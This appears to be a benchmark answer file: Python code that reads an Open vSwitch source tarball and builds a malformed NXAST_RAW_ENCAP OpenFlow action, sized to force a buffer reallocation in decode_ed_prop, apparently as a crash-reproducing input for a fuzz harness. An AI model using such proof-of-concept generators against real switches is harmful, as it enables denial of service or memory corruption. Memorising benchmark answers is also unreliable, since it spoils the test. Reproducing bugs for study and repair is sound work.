import os
import re
import tarfile
import tempfile
import struct
from typing import Dict, List, Optional, Tuple, Any


def _read_text(path: str) -> str:
    with open(path, "rb") as f:
        data = f.read()
    try:
        return data.decode("utf-8", errors="ignore")
    except Exception:
        return data.decode("latin1", errors="ignore")


def _strip_c_comments(s: str) -> str:
    s = re.sub(r"/\*.*?\*/", "", s, flags=re.S)
    s = re.sub(r"//.*?$", "", s, flags=re.M)
    return s


def _safe_eval_int(expr: str, macros: Dict[str, int]) -> Optional[int]:
    expr = _strip_c_comments(expr).strip()
    if not expr:
        return None

    expr = re.sub(r"\bUINT(?:8|16|32|64)_C\s*\(\s*([^)]+)\s*\)", r"(\1)", expr)
    expr = re.sub(r"\bINT(?:8|16|32|64)_C\s*\(\s*([^)]+)\s*\)", r"(\1)", expr)

    def repl_cast(m):
        inner = m.group(1)
        return inner

    # Remove simple casts like (uint32_t)X or (enum foo)X.
    expr = re.sub(r"\(\s*(?:unsigned\s+)?(?:long\s+long|long|short|int|char|size_t|uint\d+_t|int\d+_t|ovs_be\d+|enum\s+\w+|struct\s+\w+)\s*\)\s*([A-Za-z_0-9xX+\-*/%<>&|^~() ]+)", repl_cast, expr)

    # Replace defined macros in expression.
    # Avoid replacing when part of longer identifier.
    for _ in range(3):
        changed = False
        for name, val in list(macros.items()):
            if name in expr:
                new_expr = re.sub(r"\b" + re.escape(name) + r"\b", str(int(val)), expr)
                if new_expr != expr:
                    expr = new_expr
                    changed = True
        if not changed:
            break

    expr = expr.strip()
    # Strip integer suffixes.
    expr = re.sub(r"(?<=\b\d)(?:[uUlL]|UL|LU|ULL|LLU)+\b", "", expr)
    expr = re.sub(r"(?<=\b0x[0-9A-Fa-f]+)(?:[uUlL]|UL|LU|ULL|LLU)+\b", "", expr)

    if re.search(r"[A-Za-z_]\w*", expr):
        return None

    try:
        # Allow only basic operators via Python eval on sanitized string.
        # This is still controlled by our regex filters above.
        v = eval(expr, {"__builtins__": None}, {})
        if isinstance(v, bool):
            v = int(v)
        if isinstance(v, int):
            return v
    except Exception:
        return None
    return None


def _collect_macros_from_text(text: str, macros: Dict[str, int]) -> Dict[str, int]:
    text = _strip_c_comments(text)
    for line in text.splitlines():
        m = re.match(r"^\s*#\s*define\s+([A-Za-z_]\w*)\s+(.+?)\s*$", line)
        if not m:
            continue
        name = m.group(1)
        expr = m.group(2).strip()
        if expr.startswith("(") and expr.endswith(")") and expr.count("(") == expr.count(")"):
            expr2 = expr[1:-1].strip()
        else:
            expr2 = expr
        val = _safe_eval_int(expr2, macros)
        if val is not None:
            macros[name] = val
    return macros


def _find_files(root: str, name_pred) -> List[str]:
    out = []
    for dp, _, fn in os.walk(root):
        for f in fn:
            p = os.path.join(dp, f)
            try:
                if name_pred(p):
                    out.append(p)
            except Exception:
                pass
    return out


def _find_first_file_containing(root: str, needle: str, exts: Tuple[str, ...] = (".c", ".h", ".cc", ".cpp")) -> Optional[str]:
    for dp, _, fn in os.walk(root):
        for f in fn:
            if not f.endswith(exts):
                continue
            p = os.path.join(dp, f)
            try:
                with open(p, "rb") as fh:
                    data = fh.read()
                if needle.encode("utf-8") in data:
                    return p
            except Exception:
                continue
    return None


def _extract_c_block(text: str, start_pat: str) -> Optional[str]:
    m = re.search(start_pat, text)
    if not m:
        return None
    i = m.end()
    # Find first '{' after match
    brace = text.find("{", i)
    if brace < 0:
        return None
    depth = 0
    j = brace
    while j < len(text):
        c = text[j]
        if c == "{":
            depth += 1
        elif c == "}":
            depth -= 1
            if depth == 0:
                return text[brace:j + 1]
        j += 1
    return None


_C_TYPE_SIZES = {
    "uint8_t": 1,
    "int8_t": 1,
    "char": 1,
    "unsigned char": 1,
    "int": 4,
    "unsigned": 4,
    "unsigned int": 4,
    "uint16_t": 2,
    "int16_t": 2,
    "ovs_be16": 2,
    "uint32_t": 4,
    "int32_t": 4,
    "ovs_be32": 4,
    "uint64_t": 8,
    "int64_t": 8,
    "ovs_be64": 8,
    "ofp_port_t": 4,
}


def _parse_struct_fields(struct_text: str, macros: Dict[str, int]) -> List[Dict[str, Any]]:
    body = struct_text
    body = _strip_c_comments(body)
    # extract inside braces
    lb = body.find("{")
    rb = body.rfind("}")
    if lb < 0 or rb < 0 or rb <= lb:
        return []
    body = body[lb + 1:rb]
    fields = []
    for raw in body.split(";"):
        line = raw.strip()
        if not line:
            continue
        # Ignore preprocessor directives or empty lines
        if line.startswith("#"):
            continue
        line = " ".join(line.split())
        # Skip bitfields
        if ":" in line:
            continue

        # Match arrays: type name[NUM]
        m = re.match(r"^(struct\s+\w+|\w+(?:\s+\w+)*)\s+(\w+)\s*\[\s*([^\]]+)\s*\]$", line)
        if m:
            ctype = m.group(1).strip()
            name = m.group(2).strip()
            n_expr = m.group(3).strip()
            n = _safe_eval_int(n_expr, macros)
            if n is None:
                n = 0
            fields.append({"kind": "array", "ctype": ctype, "name": name, "count": int(n)})
            continue

        # Match normal field: type name
        m = re.match(r"^(struct\s+\w+|\w+(?:\s+\w+)*)\s+(\w+)$", line)
        if m:
            ctype = m.group(1).strip()
            name = m.group(2).strip()
            fields.append({"kind": "scalar", "ctype": ctype, "name": name})
            continue
    return fields


class _CStructSizer:
    def __init__(self, root: str, macros: Dict[str, int]):
        self.root = root
        self.macros = macros
        self.cache_fields: Dict[str, List[Dict[str, Any]]] = {}
        self.cache_size: Dict[str, int] = {}
        self.known_struct_sizes = {
            "nx_action_header": 16,
            "ofp_action_experimenter_header": 8,
        }

    def sizeof(self, struct_name: str) -> Optional[int]:
        if struct_name in self.cache_size:
            return self.cache_size[struct_name]
        if struct_name in self.known_struct_sizes:
            self.cache_size[struct_name] = self.known_struct_sizes[struct_name]
            return self.cache_size[struct_name]

        st = self._find_struct_text(struct_name)
        if st is None:
            return None
        fields = _parse_struct_fields(st, self.macros)
        self.cache_fields[struct_name] = fields

        total = 0
        for f in fields:
            if f["kind"] == "array":
                sz = self._sizeof_ctype(f["ctype"])
                if sz is None:
                    self.cache_size[struct_name] = None
                    return None
                total += sz * int(f.get("count", 0))
            else:
                sz = self._sizeof_ctype(f["ctype"])
                if sz is None:
                    self.cache_size[struct_name] = None
                    return None
                total += sz
        self.cache_size[struct_name] = total
        return total

    def fields(self, struct_name: str) -> Optional[List[Dict[str, Any]]]:
        if struct_name in self.cache_fields:
            return self.cache_fields[struct_name]
        st = self._find_struct_text(struct_name)
        if st is None:
            return None
        fields = _parse_struct_fields(st, self.macros)
        self.cache_fields[struct_name] = fields
        return fields

    def _sizeof_ctype(self, ctype: str) -> Optional[int]:
        ctype = ctype.strip()
        if ctype in _C_TYPE_SIZES:
            return _C_TYPE_SIZES[ctype]
        if ctype.startswith("struct "):
            nm = ctype.split(None, 1)[1].strip()
            return self.sizeof(nm)
        # Common typedefs in OVS
        if ctype.endswith("_t") and ctype in _C_TYPE_SIZES:
            return _C_TYPE_SIZES[ctype]
        return None

    def _find_struct_text(self, struct_name: str) -> Optional[str]:
        # Search in likely include dirs first.
        candidates = []
        for base in ("include", "lib", "ofproto", "ovsdb", "tests"):
            p = os.path.join(self.root, base)
            if os.path.isdir(p):
                candidates.append(p)
        candidates.append(self.root)

        pat = re.compile(r"\bstruct\s+" + re.escape(struct_name) + r"\s*\{", re.M)
        for croot in candidates:
            for dp, _, fn in os.walk(croot):
                for f in fn:
                    if not (f.endswith(".h") or f.endswith(".c")):
                        continue
                    path = os.path.join(dp, f)
                    try:
                        text = _read_text(path)
                    except Exception:
                        continue
                    m = pat.search(text)
                    if not m:
                        continue
                    # Extract full struct block with brace matching
                    start = m.start()
                    brace = text.find("{", m.end() - 1)
                    if brace < 0:
                        continue
                    depth = 0
                    i = brace
                    while i < len(text):
                        if text[i] == "{":
                            depth += 1
                        elif text[i] == "}":
                            depth -= 1
                            if depth == 0:
                                # include trailing ';'
                                j = i + 1
                                while j < len(text) and text[j] != ";":
                                    j += 1
                                if j < len(text) and text[j] == ";":
                                    j += 1
                                return text[start:j]
                        i += 1
        return None


def _align8(n: int) -> int:
    return (n + 7) & ~7


def _pack_be(sz: int, val: int) -> bytes:
    if sz == 1:
        return struct.pack("!B", val & 0xFF)
    if sz == 2:
        return struct.pack("!H", val & 0xFFFF)
    if sz == 4:
        return struct.pack("!I", val & 0xFFFFFFFF)
    if sz == 8:
        return struct.pack("!Q", val & 0xFFFFFFFFFFFFFFFF)
    return b"\x00" * sz


def _build_nx_action_header(action_len: int, vendor: int, subtype: int) -> bytes:
    # struct nx_action_header:
    # ovs_be16 type; ovs_be16 len; ovs_be32 vendor; ovs_be16 subtype; uint8_t pad[6];
    return b"".join([
        struct.pack("!H", 0xFFFF),
        struct.pack("!H", action_len & 0xFFFF),
        struct.pack("!I", vendor & 0xFFFFFFFF),
        struct.pack("!H", subtype & 0xFFFF),
        b"\x00" * 6,
    ])


def _guess_vendor(macros: Dict[str, int]) -> int:
    for k in ("NX_VENDOR_ID", "NX_EXPERIMENTER_ID", "NICIRA_VENDOR_ID"):
        if k in macros:
            return int(macros[k]) & 0xFFFFFFFF
    return 0x00002320


def _guess_subtype(macros: Dict[str, int]) -> int:
    for k in ("NXAST_RAW_ENCAP",):
        if k in macros:
            return int(macros[k]) & 0xFFFF
    # Reasonable fallback; often 48+ in OVS but unknown.
    return 0xFFFF


def _guess_pkt_type(macros: Dict[str, int]) -> int:
    for k in ("PT_ETH", "PACKET_TYPE_ETH", "PACKET_TYPE_ETHERNET", "PT_DEFAULT"):
        if k in macros:
            return int(macros[k]) & 0xFFFFFFFF
    return 0


def _extract_decode_ed_prop_cases(ofp_actions_text: str) -> Dict[str, str]:
    fn = _extract_c_block(ofp_actions_text, r"\bdecode_ed_prop\s*\(")
    if not fn:
        return {}
    # Crude split by case labels.
    cases = {}
    # Remove strings to avoid braces confusion in our heuristics
    src = fn
    # capture case label and the following block text up to next case/default at same switch indentation.
    # We'll just locate all case positions and slice.
    case_iter = list(re.finditer(r"\bcase\s+(NX_ED_PROP_[A-Za-z0-9_]+)\s*:", src))
    if not case_iter:
        return {}
    for idx, m in enumerate(case_iter):
        name = m.group(1)
        start = m.end()
        end = case_iter[idx + 1].start() if idx + 1 < len(case_iter) else len(src)
        cases[name] = src[start:end]
    return cases


def _pick_prop_type(macros: Dict[str, int], cases: Dict[str, str]) -> Tuple[str, int]:
    # Only consider types that appear in decode_ed_prop.
    candidates = []
    for name, body in cases.items():
        if name not in macros:
            continue
        score = 0
        up = name.upper()
        low = body.lower()
        if any(t in up for t in ("HEADER", "RAW", "DATA", "BYTES", "PAYLOAD", "TEMPLATE")):
            score += 10
        if "memcpy" in low or "ofpbuf_put" in low or "put_uninit" in low:
            score += 5
        if "oxm" in low or "nxm" in low or "mf_" in low or "ofpact_" in low:
            score -= 10
        if "goto bad" in low or "ofperr" in low and "return" in low:
            score -= 2
        # Prefer variable-length handling.
        if re.search(r"\blen\s*<\s*", body) or re.search(r"\blen\s*>\s*", body) or re.search(r"\blen\s*!=\s*0", body):
            score += 1
        if re.search(r"\blen\s*!=\s*(?:\d+|sizeof\s*\()", body):
            score -= 1
        candidates.append((score, name, int(macros[name]) & 0xFFFF))
    if candidates:
        candidates.sort(key=lambda x: (-x[0], x[2], x[1]))
        _, name, val = candidates[0]
        return name, val

    # Fallback: any NX_ED_PROP_ macro.
    eds = [(k, v) for k, v in macros.items() if k.startswith("NX_ED_PROP_") and isinstance(v, int)]
    if eds:
        eds.sort(key=lambda kv: (kv[1], kv[0]))
        return eds[0][0], int(eds[0][1]) & 0xFFFF
    return "NX_ED_PROP_HEADER", 0


def _infer_prop_len_from_case(case_body: str, sizer: _CStructSizer, macros: Dict[str, int]) -> Tuple[Optional[int], Optional[int], bool]:
    """
    Returns (fixed_len, min_len, variable_ok).
    If fixed_len is not None, should set len exactly.
    If variable_ok True, can choose len >= min_len and multiple-of-8.
    """
    body = _strip_c_comments(case_body)
    # Try fixed numeric check: len != 8
    m = re.search(r"\blen\s*!=\s*(\d+)\b", body)
    if m:
        return int(m.group(1)), int(m.group(1)), False
    # Try fixed sizeof check: len != sizeof(struct X)
    m = re.search(r"\blen\s*!=\s*sizeof\s*\(\s*struct\s+(\w+)\s*\)", body)
    if m:
        st = m.group(1)
        sz = sizer.sizeof(st)
        if sz is not None:
            return int(sz), int(sz), False

    # Try min checks: len < N or len < sizeof(struct X)
    m = re.search(r"\blen\s*<\s*(\d+)\b", body)
    if m:
        mn = int(m.group(1))
        return None, mn, True
    m = re.search(r"\blen\s*<\s*sizeof\s*\(\s*struct\s+(\w+)\s*\)", body)
    if m:
        st = m.group(1)
        sz = sizer.sizeof(st)
        if sz is not None:
            return None, int(sz), True

    # If uses "len" in ofpbuf_put_uninit(..., len - X) then variable.
    if re.search(r"\blen\s*-\s*(\d+)\b", body) or "len" in body:
        return None, 8, True
    return None, 8, True


def _build_action_raw_encap(root: str) -> bytes:
    # Collect macros from likely headers.
    macros: Dict[str, int] = {}
    # Prioritize nicira/ext headers.
    header_candidates = _find_files(root, lambda p: os.path.basename(p) in ("nicira-ext.h", "nicira-ext.h.in") or "nicira" in os.path.basename(p).lower())
    # Also include openflow headers
    header_candidates += _find_files(root, lambda p: p.endswith(".h") and ("openflow" in p.replace("\\", "/") or "include" in p.replace("\\", "/")))
    # De-dup
    seen = set()
    uniq_headers = []
    for p in header_candidates:
        if p in seen:
            continue
        seen.add(p)
        uniq_headers.append(p)
    for p in uniq_headers[:200]:
        try:
            _collect_macros_from_text(_read_text(p), macros)
        except Exception:
            continue

    vendor = _guess_vendor(macros)
    subtype = _guess_subtype(macros)
    pkt_type = _guess_pkt_type(macros)

    ofp_actions_path = _find_first_file_containing(root, "decode_NXAST_RAW_ENCAP")
    if ofp_actions_path is None:
        ofp_actions_path = _find_first_file_containing(root, "RAW_ENCAP")
    ofp_actions_text = _read_text(ofp_actions_path) if ofp_actions_path else ""

    cases = _extract_decode_ed_prop_cases(ofp_actions_text)
    prop_name, prop_type = _pick_prop_type(macros, cases)
    prop_case_body = cases.get(prop_name, "")

    sizer = _CStructSizer(root, macros)

    # Determine action struct base size.
    base_size = None
    # Try to find struct definition for nx_action_raw_encap
    st_size = sizer.sizeof("nx_action_raw_encap")
    if st_size is not None:
        base_size = int(st_size)
    else:
        # Common OVS sizes
        base_size = 24

    # Determine property header size.
    prop_hdr_size = None
    for stn in ("nx_action_encap_decap_prop", "nx_action_encap_decap_property", "nx_ed_prop", "nx_encap_decap_prop"):
        sz = sizer.sizeof(stn)
        if sz is not None and 4 <= sz <= 16:
            # Most likely 4
            prop_hdr_size = int(sz)
            break
    if prop_hdr_size is None:
        prop_hdr_size = 4

    fixed_len, min_len, var_ok = _infer_prop_len_from_case(prop_case_body, sizer, macros)
    if fixed_len is not None:
        prop_len = _align8(int(fixed_len))
        n_props = 1
        # Ensure we exceed likely initial ofpbuf allocation (often 64) to trigger realloc.
        # If too small, add more properties.
        if base_size + n_props * prop_len <= 64:
            n_props = max(2, (65 - base_size + prop_len - 1) // prop_len)
    else:
        # Choose a length to make total around 72 bytes if possible.
        target_total = 72
        if min_len is None:
            min_len = 8
        prop_len = _align8(max(int(min_len), target_total - base_size))
        n_props = 1
        if base_size + prop_len <= 64:
            # Increase length just enough to exceed 64.
            prop_len = _align8(max(prop_len, 65 - base_size))

    action_len = base_size + n_props * prop_len
    action_len = _align8(action_len)

    # Build action bytes.
    # Prefer constructing as: nx_action_header (16) + remaining fields in nx_action_raw_encap after nxah.
    fields = sizer.fields("nx_action_raw_encap") or []
    out = bytearray()

    # Determine if struct begins with nx_action_header.
    begins_with_nxah = False
    if fields:
        f0 = fields[0]
        if f0["kind"] == "scalar" and f0["ctype"] == "struct nx_action_header":
            begins_with_nxah = True

    if begins_with_nxah:
        out += _build_nx_action_header(action_len, vendor, subtype)
        # Build remaining fields after nxah
        for f in fields[1:]:
            ctype = f["ctype"]
            nm = f["name"]
            if f["kind"] == "array":
                sz = _C_TYPE_SIZES.get(ctype, None)
                if sz is None and ctype.startswith("struct "):
                    ss = sizer.sizeof(ctype.split(None, 1)[1].strip()) or 0
                    out += b"\x00" * (ss * int(f["count"]))
                else:
                    out += b"\x00" * (sz * int(f["count"]))
                continue

            sz = _C_TYPE_SIZES.get(ctype, None)
            if sz is None and ctype.startswith("struct "):
                ss = sizer.sizeof(ctype.split(None, 1)[1].strip()) or 0
                out += b"\x00" * ss
                continue

            v = 0
            lnm = nm.lower()
            if lnm in ("n_props", "nprop", "nproperties", "n_properties"):
                v = n_props
            elif "n_props" in lnm or "nprop" in lnm:
                v = n_props
            elif "pkt_type" in lnm or "packet_type" in lnm or "new_pkt_type" in lnm:
                v = pkt_type
            out += _pack_be(sz if sz is not None else 0, v) if sz is not None else b""
    else:
        # Fall back to explicit nx_action_header layout + extra fields expected for RAW_ENCAP.
        out += _build_nx_action_header(action_len, vendor, subtype)
        # Try to mirror common layout: n_props (2), pad (2), new_pkt_type (4), pad(4)
        # Only add what fits base_size.
        rem = base_size - 16
        if rem >= 2:
            out += struct.pack("!H", n_props & 0xFFFF)
            rem -= 2
        if rem >= 2:
            out += b"\x00" * 2
            rem -= 2
        if rem >= 4:
            out += struct.pack("!I", pkt_type & 0xFFFFFFFF)
            rem -= 4
        if rem > 0:
            out += b"\x00" * rem

    # Ensure base size matches.
    if len(out) < base_size:
        out += b"\x00" * (base_size - len(out))
    elif len(out) > base_size:
        out = out[:base_size]

    # Build properties.
    # Assume property header: type(2), len(2) and then data; if hdr size differs, fill accordingly.
    for _ in range(n_props):
        prop = bytearray()
        if prop_hdr_size >= 4:
            prop += struct.pack("!H", prop_type & 0xFFFF)
            prop += struct.pack("!H", prop_len & 0xFFFF)
            prop += b"\x00" * (prop_hdr_size - 4)
        else:
            # Unlikely; just fill and ensure type/len present in first 4 bytes overall
            prop += struct.pack("!H", prop_type & 0xFFFF)[:max(0, prop_hdr_size)]
        if prop_len < len(prop):
            prop = prop[:prop_len]
        else:
            prop += b"\x00" * (prop_len - len(prop))
        out += prop

    # Pad to action_len
    if len(out) < action_len:
        out += b"\x00" * (action_len - len(out))
    elif len(out) > action_len:
        out = out[:action_len]

    return bytes(out)


def _detect_needs_version_prefix(root: str) -> bool:
    fuzzers = _find_files(root, lambda p: p.endswith((".c", ".cc", ".cpp")) and "fuzz" in os.path.basename(p).lower())
    candidates = []
    for p in fuzzers:
        try:
            t = _read_text(p)
        except Exception:
            continue
        if "LLVMFuzzerTestOneInput" in t:
            candidates.append((p, t))
    if not candidates:
        # Search broadly
        p = _find_first_file_containing(root, "LLVMFuzzerTestOneInput")
        if p:
            return True if "data[0]" in _read_text(p) and "version" in _read_text(p) else False
        return False

    # Heuristic: if any fuzzer consumes a byte for version and then advances data pointer.
    for _, t in candidates:
        if re.search(r"\bversion\b", t) and (re.search(r"\bdata\s*\[\s*0\s*\]", t) or "ConsumeIntegral" in t):
            if re.search(r"\bdata\s*\+\+", t) or re.search(r"\bdata\s*=\s*data\s*\+\s*1", t) or "ConsumeBytes" in t:
                return True
    return False


class Solution:
    def solve(self, src_path: str) -> bytes:
        with tempfile.TemporaryDirectory() as td:
            with tarfile.open(src_path, "r:*") as tf:
                tf.extractall(td)

            # Some tarballs contain a single top directory.
            entries = [os.path.join(td, x) for x in os.listdir(td)]
            root = td
            if len(entries) == 1 and os.path.isdir(entries[0]):
                root = entries[0]

            action = _build_action_raw_encap(root)

            if _detect_needs_version_prefix(root):
                # Choose OpenFlow 1.5 if likely supported, else 1.3.
                # Use 0x06 (OFP15_VERSION) as common in OVS, fallback to 0x04.
                version = 0x06
                return bytes([version]) + action

            return action